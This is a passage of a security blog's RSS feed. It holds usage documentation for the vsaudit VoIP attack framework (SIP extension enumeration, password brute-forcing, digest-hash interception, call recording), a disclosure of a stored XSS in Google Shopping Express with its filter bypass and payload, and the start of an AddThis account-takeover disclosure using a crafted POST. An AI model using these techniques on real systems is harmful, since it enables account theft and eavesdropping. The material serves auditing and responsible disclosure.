    | 127.0.0.1        | 5060/udp  | 7003                | no   | -                    |
    ------------------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Enumerating&lt;/strong&gt; using &lt;strong&gt;single target&lt;/strong&gt; and &lt;strong&gt;dictionary&lt;/strong&gt; extensions &lt;strong&gt;list&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; enum ext-list 127.0.0.1

    starting enumeration on address:    127.0.0.1
    using ports-range:                  5060-5060 (udp)

    + 127.0.0.1:5060         extension &#39;7002&#39; enabled   [no auth]
    &amp;gt; testing extension: 3001                  

    ------------------------------------------------------------------------------------
    | Device           | Port      | Extension           | Auth | Password             |
    ------------------------------------------------------------------------------------
    | 127.0.0.1        | 5060/udp  | 7001                | yes  | 123                  |
    ------------------------------------------------------------------------------------
    | 127.0.0.1        | 5060/udp  | 7002                | no   | -                    |
    ------------------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; you can write your own dictionary lists and locate them in the directory ‘list/’.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Enumerating&lt;/strong&gt; using &lt;strong&gt;single target&lt;/strong&gt; and &lt;strong&gt;dictionary&lt;/strong&gt; extensions &lt;strong&gt;list with password&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;You can append a password to an extension name such as:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    ...
    7000
    7001:~123456
    7002
    7003:~examplepasswd
    ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, when you start &lt;strong&gt;enumerating&lt;/strong&gt; address with &lt;strong&gt;dictionary list&lt;/strong&gt;, &lt;strong&gt;if&lt;/strong&gt; vsaudit &lt;strong&gt;found&lt;/strong&gt; the &lt;strong&gt;password&lt;/strong&gt; on the &lt;strong&gt;right&lt;/strong&gt; of extension
separated by the &lt;strong&gt;separator&lt;/strong&gt; &lt;code&gt;:~&lt;/code&gt; It will &lt;strong&gt;automatically tries&lt;/strong&gt; the &lt;strong&gt;authentication&lt;/strong&gt; with the &lt;strong&gt;md5 challenge&lt;/strong&gt;.&lt;/p&gt;

&lt;h4 id=&quot;bruteforce-extensions&quot;&gt;Bruteforce extensions&lt;/h4&gt;

&lt;p&gt;Here you can try to &lt;strong&gt;bruteforce&lt;/strong&gt; the &lt;strong&gt;extensions&lt;/strong&gt; with a &lt;strong&gt;password list&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;How to use it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; bf ext-list psw-list 127.0.0.1

    starting bruteforce on address:     127.0.0.1
    using ports-range:                  5060-5060 (udp)

    + 127.0.0.1:5060         extension 7001             password: 123                   
    + 127.0.0.1:5060         extension 7002             password: -                      
    &amp;gt; testing authentication: 3001             : manuelito             
    ------------------------------------------------------------------------------------
    | Device           | Port      | Extension           | Auth | Password             |
    ------------------------------------------------------------------------------------
    | 127.0.0.1        | 5060/udp  | 7001                | yes  | 123                  |
    ------------------------------------------------------------------------------------
    | 127.0.0.1        | 5060/udp  | 7002                | no   | -                    |
    ------------------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;or&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; bf 7000-7003 psw-list 0.0.0.0

    starting bruteforce on address:     0.0.0.0
    using ports-range:                  5060-5060 (udp)

    + 0.0.0.0:5060           extension 7001             password: 123                   
    + 0.0.0.0:5060           extension 7002             password: -                      
    + 0.0.0.0:5060           extension 7003             password: -                      

    ------------------------------------------------------------------------------------
    | Device           | Port      | Extension           | Auth | Password             |
    ------------------------------------------------------------------------------------
    | 0.0.0.0          | 5060/udp  | 7001                | yes  | 123                  |
    ------------------------------------------------------------------------------------
    | 0.0.0.0          | 5060/udp  | 7002                | no   | -                    |
    ------------------------------------------------------------------------------------
    | 0.0.0.0          | 5060/udp  | 7003                | no   | -                    |
    ------------------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;get-the-live-network-traffic&quot;&gt;Get the live network traffic&lt;/h4&gt;

&lt;p&gt;Here you can &lt;strong&gt;monitor live network traffic&lt;/strong&gt; using standard &lt;strong&gt;bpf filter&lt;/strong&gt; (&lt;strong&gt;Barkeley Packet Filter&lt;/strong&gt;).&lt;/p&gt;

&lt;p&gt;How to use it:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Get tcp&lt;/strong&gt; or &lt;strong&gt;udp&lt;/strong&gt; live network &lt;strong&gt;traffic&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; live

    capturing local network traffic
    using barkeley packet filter:   udp

    Packet length: 631, Time: 2015-04-11 09:45:43
    ---------------------------------------------
    SIP/2.0 401 Unauthorized
    Via: SIP/2.0/UDP 192.168.1.196:5060;branch=z9hG4bKf083b96c-8cde-e411-85f6-000c29bac856;received=192.168.1.196;rport=5060
    From: &quot;pentester&quot; &amp;lt;sip:7001@192.168.1.100&amp;gt;;tag=aa7fb86c-8cde-e411-85f6-000c29bac856
    To: &amp;lt;sip:192.168.1.100&amp;gt;;tag=as54658d12
    Call-ID: 0683b86c-8cde-e411-85f6-000c29bac856@deftcode
    CSeq: 1 INVITE
    Server: Asterisk PBX 11.7.0~dfsg-1ubuntu1
    Allow: INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY, INFO, PUBLISH
    Supported: replaces
    WWW-Authenticate: Digest algorithm=MD5, realm=&quot;asterisk&quot;, nonce=&quot;39e13888&quot;
    Content-Length: 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Get tcp&lt;/strong&gt; or &lt;strong&gt;udp&lt;/strong&gt; live network &lt;strong&gt;traffic filtered&lt;/strong&gt; by &lt;strong&gt;ip address&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; live [addr]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; if you want to intercept tcp traffic, you need to set environment variable to ‘tcp’ like: ‘set transport tcp’&lt;/p&gt;

&lt;h4 id=&quot;intercept-the-network-traffic-by-custom-bpf&quot;&gt;Intercept the network traffic by custom bpf&lt;/h4&gt;

&lt;p&gt;Here you can &lt;strong&gt;monitor traffic&lt;/strong&gt; by using a &lt;strong&gt;custom barkeley packet filter syntax&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;How to use it:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Get&lt;/strong&gt; all &lt;strong&gt;udp&lt;/strong&gt; network &lt;strong&gt;traffic filtered&lt;/strong&gt; by &lt;strong&gt;destination port 5060&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; in udp dst port 5060

    capturing local network traffic
    using barkeley packet filter:   udp dst port 5060

    Packet length: 631, Time: 2015-04-11 09:44:02
    ---------------------------------------------
    SIP/2.0 401 Unauthorized
    Via: SIP/2.0/UDP 192.168.1.196:5060;branch=z9hG4bK5a7cf230-8cde-e411-85f6-000c29bac856;received=192.168.1.196;rport=5060
    From: &quot;pentester&quot; &amp;lt;sip:7001@192.168.1.100&amp;gt;;tag=aeb5f130-8cde-e411-85f6-000c29bac856
    To: &amp;lt;sip:192.168.1.100&amp;gt;;tag=as159ad5f0
    Call-ID: e8b7f130-8cde-e411-85f6-000c29bac856@deftcode
    CSeq: 1 INVITE
    Server: Asterisk PBX 11.7.0~dfsg-1ubuntu1
    Allow: INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY, INFO, PUBLISH
    Supported: replaces
    WWW-Authenticate: Digest algorithm=MD5, realm=&quot;asterisk&quot;, nonce=&quot;6e46f041&quot;
    Content-Length: 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Intercept&lt;/strong&gt; the &lt;strong&gt;sip md5 challenge&lt;/strong&gt; response &lt;strong&gt;hash&lt;/strong&gt; (&lt;strong&gt;WWW-Authenticate&lt;/strong&gt;):&lt;/p&gt;

&lt;p&gt;You can try to intercept the md5 challenge during the sip handshake authentication. &lt;/p&gt;

&lt;p&gt;Here is how handshake was performed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    md5_a = md5(username : realm : password)        # Encode first string.
    md5_b = md5(method : request_uri)               # Encode last string.

    md5_f = md5(md5_a : nonce : md5_b)              # Here is the encoded &#39;response&#39; hash.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;How to use it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; in password

    capturing local network traffic
    using barkeley packet filter:   udp or tcp

    2015-04-11 19:21:26: Handshake request data
    -------------------------------------------
    WWW-Authenticate: Digest algorithm=MD5
    realm=&quot;asterisk&quot;
    nonce=&quot;1edf8169&quot;

    2015-04-11 19:21:26: Handshake request data
    -------------------------------------------
    WWW-Authenticate: Digest algorithm=MD5
    realm=&quot;asterisk&quot;
    nonce=&quot;1edf8169&quot;

    2015-04-11 19:21:26: Found an md5 challenge
    -------------------------------------------
    Authorization: Digest username=&quot;7001&quot;
    realm=&quot;asterisk&quot;
    nonce=&quot;1edf8169&quot;
    uri=&quot;sip:192.168.1.100&quot;
    algorithm=MD5
    response=&quot;ad711f90b89907efccafcb31db11e034&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Record&lt;/strong&gt; the live &lt;strong&gt;network traffic stream&lt;/strong&gt; to &lt;strong&gt;file&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; in udp portrange 10000-20000 record
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The traffic will be recorded to ./raw/data.raw and action stay in background.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Daemonize&lt;/strong&gt; the &lt;strong&gt;intercept process&lt;/strong&gt; in a &lt;strong&gt;session&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; in udp dst port 5060 detach
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Attach&lt;/strong&gt; to an &lt;strong&gt;opened session&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;First &lt;strong&gt;show&lt;/strong&gt; the &lt;strong&gt;active sessions&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    vsaudit &amp;gt; session list

    - session id: 0     intercept detached in progress

    + Use session [session_id] to attach to process
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Use&lt;/strong&gt; the session &lt;code&gt;[session-id]&lt;/code&gt; to &lt;strong&gt;attach it&lt;/strong&gt;, then press &lt;strong&gt;CTRL+C&lt;/strong&gt; to &lt;strong&gt;close&lt;/strong&gt; the &lt;strong&gt;descriptor and session&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    vsaudit &amp;gt; session 0

    - session id: 0     intercept detached in progress
    + Packet Capture stopped by interrupt signal.
    0 packets received by filter
    0 packets dropped by kernel
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;informations-commands-1&quot;&gt;Informations commands&lt;/h3&gt;

&lt;h4 id=&quot;get-informations-about-modules-or-address&quot;&gt;Get informations about modules or address&lt;/h4&gt;

&lt;p&gt;Here you can &lt;strong&gt;retrieve&lt;/strong&gt; the &lt;strong&gt;informations&lt;/strong&gt; about a custom &lt;strong&gt;module&lt;/strong&gt; or an &lt;strong&gt;address&lt;/strong&gt; located in the report list.&lt;/p&gt;

&lt;p&gt;How to use it:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Get module&lt;/strong&gt; informations:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; info asterisk

Module &#39;asterisk&#39; found:

+ Name:         Asterisk auditing module v. 2015.1
+ Author:       Federico Fazzi &amp;lt;eurialo@deftcode.ninja&amp;gt;

+ Description:  This is a module that manages the asterisk service like
                service identification and extensions enumeration.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Get address&lt;/strong&gt; informations:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; info 127.0.0.1

Address &#39;127.0.0.1&#39; found:

+ Device:   127.0.0.1
+ Port:     5060/udp

+ Motd:     Asterisk PBX 11.7.0~dfsg-1ubuntu1
+ Allows:   INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY, INFO, PUBLISH

+ Extensions:

------------------------------------------------------------------------------------
| Device           | Port      | Extension           | Auth | Password             |
------------------------------------------------------------------------------------
| 127.0.0.1        | 5060/udp  | 7002                | no   | -                    |
------------------------------------------------------------------------------------
| 127.0.0.1        | 5060/udp  | 7003                | no   | -                    |
------------------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Show&lt;/strong&gt; the &lt;strong&gt;report list&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; report

----------------------------------------------------------------------------------------------------------------------
| Device           | Port      | Banner                                   | Allows                                   |
----------------------------------------------------------------------------------------------------------------------
| 127.0.0.1        | 5060/udp  | Asterisk PBX 11.7.0~dfsg-1ubuntu1        | INVITE, ACK, CANCEL, OPTIONS, BYE        |
----------------------------------------------------------------------------------------------------------------------
+ Consider to use: i [device] to retrieve full device informations
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Show&lt;/strong&gt; the &lt;strong&gt;extensions list&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; exts

------------------------------------------------------------------------------------
| Device           | Port      | Extension           | Auth | Password             |
------------------------------------------------------------------------------------
| 127.0.0.1        | 5060/udp  | 7003                | no   | -                    |
------------------------------------------------------------------------------------
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Show&lt;/strong&gt; the &lt;strong&gt;active session&lt;/strong&gt; list&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; session list

- session id: 0     intercept detached in progress

+ Use session [session_id] to attach to process
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;Decode on-the-fly&lt;/strong&gt; the &lt;strong&gt;raw data-file&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This command &lt;strong&gt;decodes on-the-fly&lt;/strong&gt; the &lt;strong&gt;raw data stream&lt;/strong&gt; that is stored in a &lt;strong&gt;file&lt;/strong&gt; with &lt;strong&gt;sox library&lt;/strong&gt;.
It’s &lt;strong&gt;useful&lt;/strong&gt; to &lt;strong&gt;listen&lt;/strong&gt; the &lt;strong&gt;voice-call in realtime&lt;/strong&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; decode [raw-file]
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;global-commands-1&quot;&gt;Global commands&lt;/h3&gt;

&lt;h4 id=&quot;display-the-help-message&quot;&gt;Display the help message&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; help
or
vsaudit &amp;gt; h [description|environment|audit|filters|informations|global]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Example:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; h

    + DESCRIPTION:

        The vsaudit is an opensource framework to perform attacks to general voip services
        It allows to scans the whole network or single host to do the gathering phase, then 
        it is able to search for most known vulnerabilities on the founds alive hosts and 
        try to exploit them.


    + ENVIRONMENT COMMANDS:

        Command         Args                    Description
        s|set           [key] [value]           Set an environment variable
        g|get           [key]                   Get an environment variable value/s
        e|env           -                       Display all environment variables


    + ENVIRONMENT VARIABLES:

        Option          Value                   Description
        PORT            [*r|5060]               Set port range (default: 5060)
        TIMEOUT         [1|0.5]                 Set scanner timeout connect()/recv() (default: 1 seconds)
        THREADS         [1|200]                 Set scanner threads limit (default: 50 concurrency)
        TRANSPORT       [udp|tcp]               Set transport for enumeration/bruteforce (default: udp)
        IFACE           [eth0|wlan1]            Indicate which interface to use to capture network traffic (default: eth0)
        DUMPHEX         [on|off]                Dump network traffic in hexadecimal (default: off)
        DUMPCLEAN       [on|off]                Clear network traffic skipping unicode frame bytes (default: on)

    * r: range  ex. &#39;0-65535&#39;


    + AUDIT COMMANDS:

        Command         Args                    Description
        f|fcheck        -                       Check for common configurations mistakes
        sn|scan         [addr[/24]]             Start information gathering scanner
        en|enum         [*r|*e] [addr]          Enumerate/Test sip extensions (accounts)
        bf|bruteforce   [*r|*e] [*p] [addr]     Try to bruteforce sip extension(s)

        * r: range  ex. 0500-6000
        * e: ext-file   ex. &#39;ext-list&#39;
        * p: psw-file   ex. &#39;psw-list&#39;


    + PCAP BASE FILTERS:

        Filter                                  Description
        udp dst port 5060                       Intercept destination udp traffic to destination port 5060
        tcp port 5060                           Intercept source and destination tcp traffic from source port 5060
        ip host 192.168.1.100                   Intercept source and destination both udp/tcp traffic
        password                                Intercept the sip md5 challenge response hash (WWW-Authenticate)


    + INFO COMMANDS:

        Command         Args                    Description
        i|info          [module|addr]           Return informations about module or address in report list
        r|report        -                       Show scanner report with grouped trasports data
        ex|exts         -                       Show extensions enumeration report
        se|session      [list|session_id]       Show extensions enumeration report
        lv|live         [addr]                  Get all or filtered live network traffic data
        in|intercept    [pcap-filter]           Filter network traffic using pcap filters (live extended)
        dc|decode       [raw-file]              Decode on-the-fly raw data-file stream (listen the voice-call)

        * intercept: append option &#39;detach&#39; to sessionize action
        * intercept: append option &#39;record&#39; to save stream to file


    + GLOBAL COMMANDS:

        Command         Args                    Description
        q|quit|exit     -                       Exit
        h|help          [what]                  Display the help messages
                                                description | environment | audit | filters | informations | global
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;quit-from-the-framework&quot;&gt;Quit from the framework&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;vsaudit &amp;gt; exit
or
vsaudit &amp;gt; q
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;contribution-and-the-sources&quot;&gt;Contribution and the sources&lt;/h3&gt;

&lt;p&gt;If you want contribute to the vsaudit project you can start by fork the project in the github repository.&lt;/p&gt;

&lt;p&gt;&lt;span id=&quot;sources-list&quot;&gt;
&lt;a href=&quot;https://github.com/sanvil/vsaudit/&quot; title=&quot;GitHub vsaudit&quot;&gt;View on GitHub&lt;/a&gt;
&lt;a href=&quot;https://github.com/sanvil/vsaudit/archive/master.zip&quot; title=&quot;Download vsaudit&quot;&gt;Direct Download&lt;/a&gt;
&lt;/span&gt;&lt;/p&gt;
</description>
				<pubDate>Mon, 11 May 2015 22:50:00 +0200</pubDate>
				<link>http://deftcode.ninja/post/vsaudit-voip-security-audit-framework/</link>
				<guid isPermaLink="true">http://deftcode.ninja/post/vsaudit-voip-security-audit-framework/</guid>
				
				
				<category>security</category>
				
				<category>coding</category>
				
			</item>
		
			<item>
				<title>Disclosure: Stored XSS in Google Shopping Express</title>
				<description>&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;

&lt;p&gt;Found a Cross-site Scriping in Google Shopping Express Through It’s Wallet data.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Wikipedia: Google Shopping Express is a same-day shopping service (“shop local stores online and get items delivered on the same day”) from Google that was launched on a free trial basis in San Francisco and Silicon Valley in spring 2013 and publicly in September that year. In spring 2014 it was expanded to New York and Los Angeles, and in fall 2014 to Chicago, Boston, and Washington, DC.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;proof-of-concept-of-stored-xss&quot;&gt;Proof of Concept of Stored XSS:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Go to the Google Shopping Express page &lt;a href=&quot;https://www.google.com/shopping/express/&quot; title=&quot;Google Shopping Express&quot;&gt;Google Shopping Express&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Click to “Deliver to”, then “Manage delivery addresses”&lt;/li&gt;
  &lt;li&gt;Add a new address through Google Wallet popup (this step is XSS filtered)&lt;/li&gt;
  &lt;li&gt;Back to Google Shopping Express home and click again to “Deliver to”&lt;/li&gt;
  &lt;li&gt;Edit the previously added address (this is needed to bypass the XSS filter applied in the fourth step)&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The vulnerability lives in the “City” input, so.. replace the city address with this XSS vector&lt;/p&gt;

    &lt;pre&gt;&lt;code&gt;  &amp;lt;img src=x onerror=prompt(1)&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
  &lt;li&gt;Save and back to Google Shopping Express home&lt;/li&gt;
  &lt;li&gt;The payload was triggered&lt;/li&gt;
  &lt;li&gt;(However you could add directly the vector in https://wallet.google.com ;)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;example-demostration-screen&quot;&gt;Example demostration screen&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Google Shopping Express Stored Cross-site Scriping&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/images/security/responsible-disclosure/google-xss.png&quot;&gt;&lt;img src=&quot;/images/security/responsible-disclosure/google-xss.png&quot; alt=&quot;Google Shopping Express Stored XSS&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;example-demostrations-video&quot;&gt;Example demostration’s video&lt;/h3&gt;

&lt;div class=&quot;photo_frame_center&quot;&gt;
	&lt;video width=&quot;480&quot; height=&quot;360&quot; controls=&quot;&quot;&gt;
		Sorry, your browser doesn&#39;t support embedded videos, 
		but don&#39;t worry, you can &lt;a href=&quot;/video/security/responsible-disclosure/google-xss.ogv&quot;&gt;Download It&lt;/a&gt;
		and watch it with your favorite video player!
		&lt;source src=&quot;/video/security/responsible-disclosure/google-xss.ogv&quot; type=&quot;video/ogg; codecs=&amp;quot;theora, vorbis&amp;quot;&quot; /&gt;
	&lt;/video&gt;
&lt;/div&gt;

&lt;p&gt;Watch in &lt;a href=&quot;https://www.youtube.com/watch?v=oFeD74zwA00&quot; class=&quot;lighter-red&quot; title=&quot;Google Shopping Express XSS&quot; target=&quot;_blank&quot;&gt;YouTube&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;disclosure&quot;&gt;Disclosure:&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;09/11/2014&lt;/strong&gt; – Report to Google Security Team&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;10/11/2014&lt;/strong&gt; – Received a first feedback said that the report was triaged&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;10/11/2014&lt;/strong&gt; – Received a second feedback said that the vulnerability exists&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;11/11/2014&lt;/strong&gt; – Reply from Google Security Bot - The panel has decided to issue a reward of $5000&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;12/11/2014&lt;/strong&gt; – Public disclosure&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;acknowledgement&quot;&gt;Acknowledgement&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;/images/security/responsible-disclosure/google-reward-mail.png&quot;&gt;&lt;img src=&quot;/images/security/responsible-disclosure/google-reward-mail.png&quot; alt=&quot;Google Security Team - Reward&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Thanks to Google Security Team for the &lt;a href=&quot;http://www.google.com/about/appsecurity/hall-of-fame/reward/&quot; title=&quot;Google Hall Of Fame - Federico Fazzi&quot;&gt;Google Hall Of Fame&lt;/a&gt;.&lt;/p&gt;
</description>
				<pubDate>Sun, 09 Nov 2014 01:43:08 +0100</pubDate>
				<link>http://deftcode.ninja/post/stored-xss-in-google-shopping-express-through-wallet/</link>
				<guid isPermaLink="true">http://deftcode.ninja/post/stored-xss-in-google-shopping-express-through-wallet/</guid>
				
				
				<category>responsible-disclosure</category>
				
			</item>
		
			<item>
				<title>Disclosure: How I&#39;m able to take control of any Addthis.com user account!</title>
				<description>&lt;h3 id=&quot;description&quot;&gt;Description&lt;/h3&gt;

&lt;p&gt;During publishing this site I’ve added the Addthis.com plugin (one of the most popular plugin) for sharing content etc.. I’m was surprised when I discovered that I’m able to take complete control of any user account!.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;AddThis is the world’s largest content sharing and social insights platform:&lt;/p&gt;

  &lt;ol&gt;
    &lt;li&gt;Easy-to-use tools help users to share your content and drive viral traffic&lt;/li&gt;
    &lt;li&gt;In-depth analytics provide insight into your audience and user activity&lt;/li&gt;
    &lt;li&gt;Powerful APIs let you create your own UI, access analytics, and more&lt;/li&gt;
  &lt;/ol&gt;

&lt;/blockquote&gt;

&lt;h3 id=&quot;proof-of-concept&quot;&gt;Proof of Concept:&lt;/h3&gt;

&lt;p&gt;User_X = &lt;strong&gt;ra-5438e922313abc3a&lt;/strong&gt; Attacker&lt;br /&gt;
User_Y = &lt;strong&gt;ra-538ce0c960e04da4&lt;/strong&gt; Victim  &lt;/p&gt;

&lt;p&gt;&lt;code&gt;ra-XXXXXXXXXXXXXXXX reference to User ProfileId&lt;/code&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;User_X&lt;/strong&gt; visit the website of &lt;strong&gt;User_Y&lt;/strong&gt; that use &lt;strong&gt;Addthis plugin&lt;/strong&gt;  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;User_X&lt;/strong&gt; inspect the page source code and search for profileid string &lt;strong&gt;ra-538ce0c960e04da4&lt;/strong&gt; of &lt;strong&gt;User_Y&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;User_X login&lt;/strong&gt; into his Addthis.com account (&lt;strong&gt;ra-5438e922313abc3a&lt;/strong&gt; was assigned to &lt;strong&gt;User_X&lt;/strong&gt;)&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;User_X&lt;/strong&gt; make a &lt;strong&gt;POST Request&lt;/strong&gt; to:  &lt;strong&gt;&lt;a href=&quot;https://www.addthis.com/meta-data/boost-create-widget&quot; title=&quot;AddThis - boost-create-widget&quot; target=&quot;_blank&quot;&gt;https://www.addthis.com/meta-data/boost-create-widget&lt;/a&gt;&lt;/strong&gt; &lt;br /&gt;
endpoint with &lt;strong&gt;crafted header&lt;/strong&gt;  (&lt;a href=&quot;https://addons.mozilla.org/it/firefox/addon/live-http-headers/&quot; title=&quot;Live HTTP Headers&quot;&gt;Live HTTP Headers&lt;/a&gt;) using method &lt;code&gt;boost-create-widget&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Before User_X make a POST Request&lt;/strong&gt;, The &lt;strong&gt;pub property&lt;/strong&gt; need to be changed with vulnerable site property value (ex. &lt;strong&gt;(User_X) ra-5438e922313abc3a =&amp;gt; (User_Y) ra-538ce0c960e04da4&lt;/strong&gt;)&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&quot;example-post-request-header&quot;&gt;Example POST Request Header&lt;/h4&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span class=&quot;err&quot;&gt;Remote Address:208.49.103.220:443&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Request URL:https://www.addthis.com/meta-data/boost-create-widget&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Request Method:POST&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Status Code:200 OK&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;Request Headersview parsed&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/meta-data/boost-create-widget&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;www.addthis.com&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;keep-alive&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;1070&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Pragma&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;no-cache&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Cache-Control&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;no-cache&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Accept&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;l&quot;&gt;*/*&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;[..]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h4 id=&quot;crafted-post-form-data&quot;&gt;Crafted POST Form Data&lt;/h4&gt;

